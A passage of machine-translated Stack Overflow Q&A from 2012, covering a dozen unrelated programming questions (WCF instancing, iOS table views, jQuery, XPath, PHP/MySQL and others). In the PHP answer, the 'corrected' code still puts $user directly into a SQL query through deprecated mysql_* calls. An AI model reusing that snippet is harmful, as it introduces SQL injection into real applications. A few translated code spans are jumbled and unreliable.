根据我使用 Windows Phone 定位服务的经验（我只使用带 WiFi 访问的开发手机（即没有 SIM 卡）），定位数据有时需要几秒钟或几分钟才能获取。如果您在地下室或 GPS 找到您的访问受限区域的物理开发电话上进行测试，则很可能没有生成数据。此外，由于 Windows Phone 位置数据不一定是即时的，因此您不能总是即时调用它并期望它准备好位置数据。根据我的经验，我让用户选择加入位置服务（根据 Windows Phone Marketplace 提交要求），然后在用户使用应用程序时让后台代理提取位置数据。这样，位置数据可能会在用户需要它时准备好（例如用户保存笔记时的示例）。

这是我用 C# 为您制作的一个适用于您的 Windows Phone 应用程序的工作示例。为了简单和节省时间，该示例是一个控制台应用程序。如果您仍然无法弄清楚，我将为 Windows Phone 编写代码。有了这个，尽管您确实拥有使其工作所需的一切，但只需插入 lat 和 long 变量。[下载工作源代码](http://www.jeremiahisaacson.com/samples/TerraServiceExample.zip)(Visual Studio 2010)

C# 源代码片段

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TerraServiceExample.com.msrmaps; // add the service using statement
// http://msrmaps.com/terraservice2.asmx
namespace TerraServiceExample
{
    class Program
    {
        /// <summary> The main entry point for the application. </summary>
        static void Main(string[] args)
        {

            // Create the GPS point from your location services data
            LonLatPt location = new LonLatPt();

            // Modify Lat and Lon based on your needs
            // This example uses the GPS Coordinates for "Eau Claire, Wisconsin, United States"
            location.Lat = 44.811349;
            location.Lon = -91.498494;

            // Create a new TerraService object
            TerraService ts = new TerraService();

            // Output the nearest location from the TerraService
            Console.WriteLine(ts.ConvertLonLatPtToNearestPlace(location));

            // For console app to stay open/close easily
            Console.WriteLine("Press any key to close window...");
            Console.ReadKey();

            // Lastly, appreciate the Microsoft folks that made this available for free
            // They are all interesting individuals but you should read about Jim Gray via Wikipedia to
            // understand some history behind this cool web service.
        }
    }
} 
```

# c# - 为什么 WCF 服务每次请求都返回错误的值？

> ID：13704511
> 
> 赞同：0
> 
> 时间：2012-12-04T13:54:48.033
> 
> 标签：c#, javascript, wcf, visual-studio-2008, soap

我有以下在 Visual Studio 2008 上开发的简单 WCF 库。
在运行调用此 wcf 服务的 WCFTestClinet/javascript（使用 SOAP）时，我在以下情况下得到错误值：
1\. GetNumber --> 输出：“您的号码是0"
2\. SetNumber --> 无输出
3\. GetNumber --> 输出："Your number is 0"**而不是输出："Your number is 8" ！！！**
谁能解释为什么会发生这种情况以及我该如何解决？
谢谢

```
public class Service1 : IService1
    {
        private int Number;

        public string GetData(int value)
        {
            return string.Format("You entered: {0}", value);
        }

        public CompositeType GetDataUsingDataContract(CompositeType composite)
        {
            if (composite.BoolValue)
            {
                composite.StringValue += "Suffix";
            }
            return composite;
        }

        public string GetNumber()
        {
            return string.Format("Your number is : {0}", Number);
        }

        public void SetNumber()
        {
            Number = 8;
        }
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T13:57:20.953

这都是关于[实例](http://www.codeproject.com/Articles/86007/3-ways-to-do-WCF-instance-management-Per-call-Per)的。[默认情况下，每个会话](http://msdn.microsoft.com/en-us/library/system.servicemodel.servicebehaviorattribute.instancecontextmode.aspx)都会实例化一个服务实例；但根据配置（[例如使用 BasicHttpBinding](https://stackoverflow.com/questions/4406972/contract-requires-session-but-binding-basichttpbinding-doesnt-support-it-or)），服务可能会在每次调用时实例化（和/或根本不支持会话）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:58:08.207

可能是因为您已将 WCF 服务配置为每次调用而不是每次会话。

很好的答案告诉差异：[https ://stackoverflow.com/a/2542991/70386](https://stackoverflow.com/a/2542991/70386)

*   每次通话的工作原理：[http ://wcftutorial.net/Per-Call-Service.aspx](http://wcftutorial.net/Per-Call-Service.aspx)
*   每个会话：[http ://wcftutorial.net/Per-Session-Service.aspx](http://wcftutorial.net/Per-Session-Service.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:58:03.493

这是在同一个例子中吗？因为 Number 将始终设置为 0 否则

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:58:24.760

我没有使用 SOAP WCF，但在我使用其他 Web 服务时，我的理解是每次调用服务时都会创建一个新实例。这意味着您在 SetNumber 上所做的任何事情都不存在于后面的 GetNumber 中，因为它是一个新实例。

如果您愿意，您可以将该值设为静态以保留调用之间的更改。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T14:00:50.453

这是因为默认情况下，WCF 3.5 的实例模式是`PerCall`. 这意味着对于 WCF 接收到的每个调用，它都会创建服务类的新实例，执行调用，然后销毁该实例。

如果您想要共享值，您可以将您的服务配置为单例，如下所示：

```
[ServiceBehavior(InstanceContextMode = InstanceContextMode.Single)] 
public class  Service1 : IService1 
```

# css - CSS过渡不适用

> ID：13704512
> 
> 赞同：0
> 
> 时间：2012-12-04T13:54:48.960
> 
> 标签：css, css-transitions

我有这个页面[（](http://www.kimwilddesigns.com/Advanced-Web/ChristinaM/)它的项目）。在顶部，我在顶部导航中的“联系人”一词之后有一个 @font-face dingbat 邮件字符。我试图让它在悬停时与单词联系一起过渡到红色，但我不知道如何实现这一点，截至目前它保持黑色。此外，当在[联系页面](http://www.kimwilddesigns.com/Advanced-Web/ChristinaM/pages/contact_page.html)上时，我希望它像使用 CSS 类创建的单词联系人一样保持红色。但是我在过渡中尝试的任何事情都无法处理这个邮件角色。这可能吗？谢谢你！

[CSS 在这里](http://www.kimwilddesigns.com/Advanced-Web/ChristinaM/css/main.css)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:56:56.223

尝试使用选择器：

```
nav#main-nav ul li a:hover span {
    text-decoration: overline;
    color: #F00;
} 
```

看看现在是不是变红了。

# window - 如何为设备无关像素 (DIP) 构建 Windows 商店应用程序

> ID：13704513
> 
> 赞同：3
> 
> 时间：2012-12-04T13:54:49.043
> 
> 标签：window, windows-store-apps, density-independent-pixel, scalable

我正在构建 Windows 商店应用程序。我在 Visual Studio .net 2012 中使用 Windows 8 和 WPF。

此应用程序的 UI 应可扩展到不同的屏幕。我创建了一个页面，当在 10.6" 屏幕的分辨率为 1920 x 1080 的模拟器上运行应用程序时，控件（按钮、图像、文本）正确匹配。问题是当我更改分辨率时，控件的行为不正确

*   当分辨率或屏幕尺寸增加（例如 23" 屏幕为 1920 x 1080）时，页面上会创建空白空间；
*   当分辨率或屏幕尺寸减小（例如 10.6" 屏幕为 1024 x 768）时，控件尺寸也会增加，其中一些控件在 UI 中不可见，因为它们在底部显示得太远。

有没有办法构建独立于屏幕尺寸或分辨率的“可扩展”商店应用程序？当分辨率改变或从一个屏幕到另一个屏幕时，控件大小和字体大小应该增加和减小，但它们都应该适合空间并且不应该创建空白区域。

任何帮助将不胜感激。

谢谢你

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-09T18:18:43.433

[这篇 MSDN 文章](http://msdn.microsoft.com/en-us/library/windows/apps/hh780612.aspx)讨论了缩放到屏幕的指南。它涉及屏幕尺寸、屏幕分辨率和纵横比。它提供了一个表格，其中显示了为使用缩放以适应功能的应用推荐的最佳实践，并涉及自适应布局。文末也有参考[Guidelines for layouts]。

希望这可以帮助！

[http://msdn.microsoft.com/en-us/library/windows/apps/hh780612.aspx](http://msdn.microsoft.com/en-us/library/windows/apps/hh780612.aspx)

市民

# iphone - 在自定义表格视图单元格中删除带有按钮的行

> ID：13704516
> 
> 赞同：0
> 
> 时间：2012-12-04T13:54:58.703
> 
> 标签：iphone, objective-c, ios, uitableview, superview

这就是结构的样子。

```
--- UIView
   ---- ScrollView
       --- TableView 
```

.

```
UIView *topView = [[UIView alloc]initWithFrame:CGRectMake(0, -250, 320, 250)];

UITableView *tableView = [[UITableView alloc] initWithFrame:CGRectMake(0, 70, 320, 150) style:UITableViewStylePlain];
    tableView.autoresizingMask = UIViewAutoresizingFlexibleHeight|UIViewAutoresizingFlexibleWidth;
    tableView.delegate = self;
    tableView.dataSource = self;
    tableView.backgroundColor = [UIColor blackColor];
    tableView.separatorStyle = normal;
    [tableView reloadData];

    [topView addSubview:tableView];

    [self.scrollView addSubview:topView]; 
```

在表格视图中，我正在使用一个带有按钮的自定义表格视图单元格。这是我的 CellForRowAtIndex 中按钮的代码

```
[cell.btnDelete addTarget:self action:@selector(deleteAppointment:) forControlEvents:UIControlEventTouchUpInside]; 
```

现在要获取特定行，我在 deleteAppointment 中执行此操作

```
 UIButton *button = (UIButton *)sender;
    UITableViewCell *cell = (UITableViewCell *)button.superview;
    UITableView *tableView = (UITableView *)cell.superview;
    NSIndexPath *indexPath = [tableView indexPathForCell:cell];
    NSLog(@"row: %d",indexPath.row); 
```

但它仍然给出以下错误。

```
-[ExceptionCell indexPathForCell:]: unrecognized selector sent to instance 0x210a2fa0 
```

谁能帮我？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T14:06:02.723

它真的很简单，在`cellForRowAtIndexPath`. 只需像这样标记您的按钮

```
cell.button.tag = indexPath.row; 
```

在按钮@selector 方法中从数组或字典（即您的数据源）中删除值

```
[array removeObjectAtIndex:button.tag]; 
```

现在重新加载 tableView。

```
[tableView reloadData]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:59:51.563

该错误表示 您正在尝试调用`indexPathForCell`. 是一种方法，不是。`ExceptionCell``indexPathForCell``UITableView``UITableViewCell`

`cell.superview``UITableView`没有像您期望的那样返回您的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-05T14:24:34.043

从 TableView 中删除行时，您想要保留提供 DeleteRowsAtIndexPath 方法的直观动画，我一直在解决这个问题，并最终找到了一个简单的解决方案。

正如问题所问，我们正在使用带有自定义 UIButton 的自定义单元格来删除单元格

因此，您必须使用委托 // CallBack。下面的演示是针对 C# 中的 MonoTouch，在目标 C 中是相同的，但方法的命名略有不同 + 语法。

//TableViewController

```
//CALLBACK Methods WHEN DELETING A ROW
public void DeletedItem (MyObject arrayObject, CustomCell cellInstance)
    {
        NSIndexPath[] arrayPath = new NSIndexPath[1] { this.myTableView.IndexPathForCell (cellInstance) };

        this.myArray.RemoveItem (arrayObject);
        this.myTableView.DeleteRows (arrayPath, UITableViewRowAnimation.Fade);
    }

[Export("tableView:cellForRowAtIndexPath:")]
public virtual UITableViewCell GetCell (UITableView tableView, MonoTouch.Foundation.NSIndexPath indexPath)
    {

        ...

        cell.FactoryMethodsThatImUsing (myObject.items[indexPath.Row], DeletedItem);

        return cell;

    } 
```

//自定义单元格

```
public delegate void FOODelegateMethods (MyObject item, CustomCell instance);
public event FOODelegateMethods ItemDeleted; 
```

在我的工厂方法中

```
if (!(this.ItemDeleted is Delegate)) {
            this.ItemDeleted += new CustomCell.FOODelegateMethods (ResultCallBack);
        } 
```

然后在 DeleteItem 操作

```
partial void DeleteItem (NSObject sender)
    {
        ItemDeleted(arrayObject, this);
    } 
```

# php - PHP mysql遗漏行

> ID：13704517
> 
> 赞同：0
> 
> 时间：2012-12-04T13:55:02.727
> 
> 标签：php, mysql

所以我遇到了数据库第一行被遗漏的问题，不知道为什么。简而言之，这里是代码，省略了连接部分等。

```
$tickets="tickets";
$sql_ticket="SELECT * FROM $tickets WHERE username='$user'";
$ticket_query=mysql_query($sql_ticket);
$ticket_data=mysql_fetch_assoc($ticket_query);
while($ticket_data=mysql_fetch_assoc($ticket_query)){
// echoing in tables
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:56:07.063

删除这一行：

```
$ticket_data=mysql_fetch_assoc($ticket_query); 
```

当您在循环之外获取第一行时。更正后的代码应该是：

```
$tickets="tickets";
$sql_ticket="SELECT * FROM $tickets WHERE username='$user'";
$ticket_query=mysql_query($sql_ticket);
while($ticket_data=mysql_fetch_assoc($ticket_query)){
   // echoing in tables
} 
```

# java - 在 Android 中以编程方式配置 PPTP/L2TP VPN

> ID：13704519
> 
> 赞同：14
> 
> 时间：2012-12-04T13:55:08.863
> 
> 标签：java, android, api, vpn

*我已阅读有关[VpnService](http://developer.android.com/reference/android/net/VpnService.html)和[VpnService.Builder](http://developer.android.com/reference/android/net/VpnService.Builder.html)的信息，但无法获得将 vpn 类型设置为 PPTP 或 L2TP 的任何方法，即使我没有获得任何可以设置用户/密码的方法。*

**笔记：** `There are many questions in SO I read them but didn't find solution. I looked into ToyVpn application but this there are only 3 parameters we set in this application.`

***请帮忙。如果有 3party API，请给出参考。***

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-04T23:18:37.777

是的，stackoverflow 中的所有答案都应该告诉您 VPNService API 是用于使用自己的 VPN 堆栈（可能恰好是 PPTP/LT2P/ToyVPN/OpenVPN/MyOwnVerySecure VPN 协议）创建您自己的 VPN 应用程序，而不是配置系统 VPN .

用于配置系统 VPN 的 API 很简单，不包含在 SDK 中。

# uiview - 从 parentViewController 删除后 childViewController 没有被释放

> ID：13704520
> 
> 赞同：3
> 
> 时间：2012-12-04T13:55:16.127
> 
> 标签：uiview, uiviewcontroller, automatic-ref-counting, ios5

我正在添加一个子视图控制器，如下所示：

```
loginViewController = [self.storyboard instantiateViewControllerWithIdentifier:@"LoginViewController"];
    loginViewController.delegate = self;

[self addChildViewController:loginViewController];
[self.view addSubview:loginViewController.view];
loginViewController.view.frame = self.view.bounds;
[loginViewController didMoveToParentViewController:self]; 
```

并将其删除如下：

```
[loginViewController willMoveToParentViewController:nil];
[loginViewController.view removeFromSuperview];
[loginViewController removeFromParentViewController]; 
```

如果我理解正确，应该在 LoginViewController 中触发 dealloc 但它不会？我错过了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:06:47.597

不完全的。删除控制器的视图与被释放的控制器无关，只是控制器的视图（由控制器保留，因此不会被释放。

你有`[self addChildViewController:loginViewController];`，你把它存放在某个地方吗？也许是一个数组？如果是这种情况，那就是你的泄漏。您需要从放置它的任何位置将其删除

# jquery-mobile - jquery mobile保存按钮单击事件未触发

> ID：13704523
> 
> 赞同：1
> 
> 时间：2012-12-04T13:55:20.927
> 
> 标签：jquery-mobile

我正在研究 jQuery 移动控件。我在母版页中有一个 jqgrid，单击选定的行 ID 后，我将重定向到具有该 ID 的另一个页面。在那个页面中，我有下拉列表，它与 json 绑定。绑定后，我想通过单击按钮将数据保存到数据库。

问题是按钮单击事件没有触发，但是，当我自己运行该特定 aspx 时，按钮单击事件确实会触发。

```
 <a href="#" data-role="button" data-inline="true" id="btnsave"  data-transition="fade" 
      data-theme="b" data-icon="check" data-iconpos="right" runat="server" 
      onserverclick="btnsave_click" >Save</a> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T15:29:47.890

尝试添加`data-ajax="false"`到您的链接。

例如

```
<a href="#" data-role="button" data-ajax="false" data-inline="true" id="btnsave"
         data-transition="fade" data-theme="b"  data-icon="check" data-iconpos="right" 
         runat="server" onserverclick="btnsave_click" >Save</a> 
```

现在解释一下，[默认情况下](http://jquerymobile.com/demos/1.2.0/docs/pages/page-navmodel.html)，当您链接到 jQuery Mobile 中的页面时，JQM 通过 ajax 拉入该页面并将其附加到**当前**页面的 DOM。当 JQM 通过 ajax 拉入页面时，它只会拉入该页面，`data-role="page"`而*不会*加载可能在`<head>`页面上或其他地方的任何资源。

从你的问题和标记听起来你正在使用 asp.net，没有看到任何更多的标记/代码我很确定你的问题是你的母版页上的链接页面没有必要的代码.

通常要解决此问题，您可以将唯一内容放在链接页面的`data=role="page"`div 中，或者在调用页面时确保页面已完全加载，即没有 ajax。在您的情况下，因为看起来您正在尝试调用服务器方法，因此创建回发的代码可能在您的第二个页面的 div 之外，在这种情况下，您需要在没有 ajax 的情况下加载页面，最简单的方法是通过添加`data-ajax="false"`到您的链接。

# google-chrome - chrome.experimental.discovery.suggest 不建议 chrome://newtab

> ID：13704525
> 
> 赞同：0
> 
> 时间：2012-12-04T13:55:23.337
> 
> 标签：google-chrome, google-chrome-extension

我试图建议`http://www.w3schools.com`，通过[发现](https://developer.chrome.com/extensions/experimental.discovery.html#type-SuggestDetails)`chrome://newtab`我既没有成功也没有错误。

粗略查看[源代码](https://code.google.com/searchframe#OAMlx_jo-ck/src/chrome/browser/extensions/api/discovery/discovery_api.cc)后，我在不同的配置文件中尝试了相同的代码，但没有价值。

```
 registry->Add(extension_id(), suggested_link.Pass()); 
```

没有将我的链接添加到`chrome://newtab`.

**琐碎的演示**

***清单.json***

```
{
"name":"Discovery Demo",
"description":"This demonstrates Discovery API",
"manifest_version":2,
"version":"1",
"permissions":["experimental"],
"browser_action":{
    "default_icon":"screen.png",
    "default_popup":"popup.html"
}
} 
```

***popup.html***

```
 <html>
    <head>
    <script src="popup.js"></script>
    </head>
    <body>
    </body>
    </html> 
```

***popup.js***

```
chrome.experimental.discovery.suggest({
    "urlImage": chrome.extension.getURL("screen.png"),
    "score": 1.0,
    "linkUrl": "http://www.w3schools.com",
    "linkText": "Sample"
}); 
```

有什么我错过的，有什么建议吗？

# iphone - 切换启动视图控制器 Xcode

> ID：13704526
> 
> 赞同：1
> 
> 时间：2012-12-04T13:55:27.100
> 
> 标签：iphone, objective-c, ios, xcode, ipad

例如，如果我有两个按钮，一个用于苹果，一个用于橙色，然后我选择苹果并将我带到苹果屏幕。每次运行应用程序时，我如何才能让它进入苹果屏幕？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:26:23.837

在 viewDidLoad

```
if([[NSUserDefaults standardUserDefaults] objectForKey:@"fruit"] != nil)
{

    if ([[[NSUserDefaults standardUserDefaults] objectForKey:@"fruit"]isEqualToString:@"apple"]) {

        [self.navigationController pushViewController:appleVC animated:NO];

    }
    else{

        [self.navigationController pushViewController:orangeVC animated:NO];

    }

} 
```

和按钮方法

在苹果按钮上

```
[[NSUserDefaults standardUserDefaults] setObject:@"apple" forKey:@"fruit"]; 
```

在橙色按钮上

```
[[NSUserDefaults standardUserDefaults] setObject:@"orange" forKey:@"fruit"]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T14:05:57.893

你可以使用 NSUserDefaults 来存储这样的信息。

你会`bAppleSelected`像这样存储一个布尔值：

```
NSUserDefaults * standardUserDefaults = [NSUserDefaults standardUserDefaults];
[standardUserDefaults setBool:bAppleSelected forKey=@"appleSelected"]; 
```

您可以通过访问默认的 userDefaults 来阅读它：

```
BOOL bApple = [standardUserDefaults boolForKey=@"appleSelected"]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:04:34.910

在您的应用程序委托上，您必须有一些方法来实例化第一个控制器并将其显示在窗口中。您可以创建一个“苹果控制器”并将其推到那里

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T14:04:44.277

你可以在这里使用 NSUserdefaults，

```
NSString* fruit=@"apple";
[[NSUserDefaults standardUserDefaults]setObject:fruit forKey:@"controllerName"];
[[NSUserDefaults standardUserDefaults]synchronize]; 
```

并在 appdelegate 文件中插入 firstview 控制器的名称字符串，使用上面的 NSUserDefaults。

# xpath - 如何让 xpath 前同级为这个表工作

> ID：13704527
> 
> 赞同：0
> 
> 时间：2012-12-04T13:55:31.827
> 
> 标签：xpath

我有一个表，我需要在其中查找是否选中了与单元格对应的复选框，例如，我需要确定是否选中了作为 DeviceHelp 兄弟的复选框 id=830。

同样对于元素联系人，我将不得不检查复选框 id="72" 是否已选中/未选中

而且我只能依靠文本元素（联系人、DeviceHelp 等）来获取复选框状态，而不是可能更改的复选框 ID。

```
<tr class="row active" style="display: table-row;">
<td>
<input id="72" class="rowcheck" type="checkbox" value="true" name="ModesForUi[0].Allow" categoryid="58" disabled="">
<input type="hidden" value="false" name="ModesForUi[0].Allow">
</td>
<td> Administration - Read </td>
<td>
Contact
<input id="ModesForUi_0__ResourceID" type="hidden" value="72" name="ModesForUi[0].ResourceID">
<input id="ModesForUi_0__ModeID" type="hidden" value="12185" name="ModesForUi[0].ModeID">
</td>
<td> Controls access to Search Contacts link and to view contact details page. Navigate to Menu\Advanced\More </td>
</tr>
<tr class="row active" style="display: table-row;">
<td>
<input id="830" class="rowcheck" type="checkbox" value="true" name="ModesForUi[1].Allow" categoryid="58" disabled="">
<input type="hidden" value="false" name="ModesForUi[1].Allow">
</td>
<td> Administration - Read </td>
<td>
DeviceHelp
<input id="ModesForUi_1__ResourceID" type="hidden" value="830"     name="ModesForUi[1].ResourceID">
<input id="ModesForUi_1__ModeID" type="hidden" value="12186"     name="ModesForUi[1].ModeID">
</td>
<td> Controls access to Help icon displayed next to logout icon and next to the menu.     </td>
</tr> 
```

已尝试以下，但我没有得到复选框值

```
"ancestor::td[1]/input[1]/preceding-sibling::td[normalize-space(text())='DeviceHelp']") 
```

和

```
//tr[position()>1]/td[normalize-space(text())='DeviceHelp*']/parent::td/preceding-sibling::td/input@value 
```

请xpath专家您能否对上述路径有什么问题以及如何进入复选框有所了解？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:49:06.187

我想我知道你想在这里做什么......

试试这个设备帮助：

```
/root/tr/td[normalize-space(text())='DeviceHelp']/../td[1]/input[1]/@value 
```

这对于联系人：

```
/root/tr/td[normalize-space(text())='Contact']/../td[1]/input[1]/@value 
```

“root”就是你开始的任何节点，我添加它是为了在本地测试，因为 XML 片段不完整。

**编辑**

尝试这个：

```
//tr/td[normalize-space(text())='DeviceHelp']/../td[1]/input[1]/@value

//tr/td[normalize-space(text())='Contact']/../td[1]/input[1]/@value 
```

# eclipse - 如何使用 IViewActionDelegate？

> ID：13704528
> 
> 赞同：2
> 
> 时间：2012-12-04T13:55:33.460
> 
> 标签：eclipse, events, interface

我通过扩展 org.eclipse.ui.popupMenus 扩展点向 variablesview 菜单添加了一个菜单项，我想做的是当有人右键单击变量并单击我的菜单项时，我会将变量的值解析为 Ip格式。

我成功地添加了菜单项并使用 IViewActionDelegate 界面响应单击，但是当有人单击我的菜单项时，IAction 事件给出的信息无助于了解哪个对象发生了事件或变量的值是什么.

我的问题是，是否有办法在单击我的菜单项后找到变量的值？还是有另一种使用我不知道的接口 IViewActionDelegate 的方法，或者我没有正确使用它？

我在谷歌上检查了很多关于如何添加菜单项并找到了很好的指南： [http ://www.eclipse.org/articles/article.php?file=Article-action-contribution/index.html](http://www.eclipse.org/articles/article.php?file=Article-action-contribution/index.html)

但它不能解决我的问题，我真的需要关于这个问题的帮助。

谢谢。

# javascript - 文本输入后文本框意外移动

> ID：13704530
> 
> 赞同：0
> 
> 时间：2012-12-04T13:55:41.967
> 
> 标签：javascript, jquery, html, css

我在一些 html 中有一个文本框，它附加了一个 jquery 按钮。如果用户输入一些文本，然后将焦点从文本框移开（使用选项卡或鼠标），那么文本框会莫名其妙地向下移动大约 4 个像素。

```
<div class='input-append'>
    <input class="tin" type="text" name="s" />
    <button class="btn btn-large btn-primary" type="submit">GO!</button>
</div> 
```

和CSS：

```
.tin
{
    font: bold 1.9em sans-serif;
    height: 27px;
    -webkit-border-radius: 12px 0 0 12px;
    -moz-border-radius: 12px 0 0 12px;
    border-radius: 12px 0 0 12px;
    width: 480px;
} 
```

Chrome 和 Safari 中发生了意外的动作，但 IE 似乎截断了一些输入的文本（文本框的外边框覆盖了相当大的文本的一些底部），这让我觉得它是也许是某种线高问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:01:58.850

只是纯粹的猜测。它可能与您的CSS有关。

例如：

```
.btn
{
    width: 90px;
}
.btn:focus
{
    width: 200px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T02:54:39.507

我试过你发送的代码。如果我这样写

```
<style type="text/css">
        .tin
        {// the css}
    </style> 
```

然后问题被复制，如果我这样写

```
<script type="text/css">
        .tin
        {//css}</script> 
```

您正在使用什么方法？

# jquery - 如果 Id 匹配，则替换 - 不工作

> ID：13704533
> 
> 赞同：0
> 
> 时间：2012-12-04T13:55:54.350
> 
> 标签：jquery

我有一个简单的标题，如果它与 ID 匹配，我想用城市名称填充它。我目前正在使用`replaceWith`，它似乎只在第一次工作。不知道为什么？

这是功能：

```
function toggleDetails() {
    $(".pin").click(function() {
        var cityName =  $(this).attr('id');
        $(".city-details").toggle();

        if (cityName === 'Miami') {
            $('h3#cityName').replaceWith("Miami");
        }
        else if(cityName === 'Philadelphia') {
            $('h3#cityName').replaceWith("Philadelphia");
        }
        else if (cityName === 'Chicago') {
            $('h3#cityName').replaceWith("Chicago");
        }
        else if (cityName === 'Los-Angeles') {
            $('h3#cityName').replaceWith("Los Angeles");
        }
        else if (cityName === 'Houston') {
            $('h3#cityName').replaceWith("Houston");
        }
        else if (cityName === 'San-Diego'){
            $('h3#cityName').replaceWith("San Diego");
        }
        else if (cityName === 'Atlanta') {
            $('h3#cityName').replaceWith("Atlanta");
        }
        console.log(cityName);
    });
} 
```

HTML：

```
<p class="pin totally newyork" id="NewYork">
    New York
</p>
<p class="pin barely boston" id="Boston">
    Boston
</p>
<p class="pin fairly philadelphia" id="Philadelphia">
    Philadelphia
</p>
<p class="pin barely chicago" id="Chicago">
    Chicago
</p>
<p class="pin barely la" id="Los-Angeles">
    Los Angeles
</p>
<p class="pin fairly houston" id="Houston">
    Houston
</p> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:01:31.590

replaceWith 将用新内容替换整个 DOM 元素。这意味着在第一次调用之后，DOM 中不再有“h3”，因此后续调用将找不到与`$('h3#cityName')`选择器匹配的元素来做任何事情。

尝试`.text("NewCityName")`而不是 replaceWith

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:01:44.797

您正在用文本替换整个元素，因此当您想再次替换时，该元素不再存在。

只需替换元素中的文本。例子：

```
 $('h3#cityName').text("Miami"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:02:08.343

是否有 id 为 cityname 的 h3 元素？它没有显示在您的代码中。如果有不同的此类元素，您将需要使用

```
$('h3#' + cityName) 
```

在任何情况下，replaceWith 都将“匹配元素集中的每个元素与提供的新内容。”。在您的情况下，您可能想要设置目标元素的 html() 或 text() 。

```
$('h3#cityName').html("Chicago"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T14:05:27.050

`replaceWith`将删除元素并将其替换为给定的文本，因此在第一次之后不再有要替换的元素。尝试使用`.text`or `.html`。此外，您的代码似乎也有点多余。

```
$(".pin").click(function() {
    $(".city-details").toggle();
    $('#cityName').text(this.id.replace(/-/g, ' '));
}); 
```

[**小提琴**](http://jsfiddle.net/bBEtA/)

# nested - 使用 NSUndoManager 嵌套重做组

> ID：13704535
> 
> 赞同：1
> 
> 时间：2012-12-04T13:55:58.580
> 
> 标签：nested, undo-redo, nsundomanager

假设我有两个原子对象方法`operation1`，`operation2`它们将自己的撤消操作注册到`undoManager`. 如果我进行 bulk `operation3`，它将调用前两个操作并将撤消回调与 分组`beginUndoGrouping/endUndoGrouping`，撤消时，`NSUndoManager`不会对重做操作分组。如何将`NSUndoManager`地图撤消组变为重做组？

示例代码：

```
- (void)operation3
{
    [undoManager beginUndoGrouping];
    [self operation1]; // [undoManager setActionName:@"op1"];
    [self operation2]; // [undoManager setActionName:@"op2"];
    [undoManager endUndoGrouping];
    [undoManager setActionName:@"op3"];
    // call operation3 -> "Edit - Undo op3" -- OK
    // press Command+Z -> "Edit - Redo op1" -- not OK
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-07T08:44:34.020

您必须在撤消期间再次设置操作名称。我认为您在撤消期间仅设置了“op1”。

# ios - 我可以使用 Phonegap 实现 iTunes / Android 支付吗

> ID：13704537
> 
> 赞同：2
> 
> 时间：2012-12-04T13:56:00.870
> 
> 标签：ios, html, cordova, itunes

我有一个由 Phonegap 生成的应用程序。它工作正常，但我想为其添加付款。使用Phonegap甚至可能吗？我只想要一个警报，例如：0,79 欧元，你接受吗？没有贝宝或其他任何东西

格。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-05T00:56:43.967

对于 iOS： [iOS 应用内购买插件](https://build.phonegap.com/plugins/661)

对于 Android： [Google Play 应用内结算](https://build.phonegap.com/plugins/615)

祝你好运！

**[更新]**

参考文献更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-25T13:08:08.313

我用：

**安卓：**

com.smartmobilesoftware.inappbilling 3.0.0 Android InAppBilling [https://github.com/poiuytrez/AndroidInAppBilling/blob/master/v3/README.md](https://github.com/poiuytrez/AndroidInAppBilling/blob/master/v3/README.md)

**IOS：**

cc.fovea.plugins.inapppurchase 3.1.0 “InAppPurchase” [https://github.com/j3k0/PhoneGap-InAppPurchase-iOS](https://github.com/j3k0/PhoneGap-InAppPurchase-iOS)

（科尔多瓦 3.2 和 3.5）

# objective-c - 如何在 iOS 上获取时钟闹钟信息

> ID：13704541
> 
> 赞同：0
> 
> 时间：2012-12-04T13:56:14.617
> 
> 标签：objective-c, ios

我想在iOS上获取时钟的闹钟信息，有什么方法可以获取信息吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:06:55.550

不，没有办法做到这一点。

我不知道如何为我的答案增加可信度，除了说在 iOS 中，应用程序是“沙盒”的，因此它们不会相互“交谈”。他们可以交互的唯一方式（以**非常**受限的方式）是如果他们共享他们的 App ID 的一部分。由于股票时钟应用程序是由 Apple 开发的，因此您的应用程序永远无法访问股票应用程序中的数据。

# c# - SemanticZoom：是否可以在后面的代码中停止视图转换？

> ID：13704543
> 
> 赞同：0
> 
> 时间：2012-12-04T13:56:24.073
> 
> 标签：c#, windows-8, winrt-xaml

